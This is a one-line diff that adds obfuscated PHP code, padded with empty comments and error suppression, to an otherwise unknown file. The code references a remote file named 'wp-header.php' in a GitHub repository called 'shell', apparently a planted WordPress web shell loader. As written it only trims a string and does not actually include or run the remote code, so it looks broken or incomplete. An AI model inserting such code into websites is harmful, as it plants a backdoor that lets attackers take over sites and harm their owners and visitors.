@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@trim("?>".trim("https://github.com/xNightGanzzz/shell/raw/main/wp-header.php"));?>
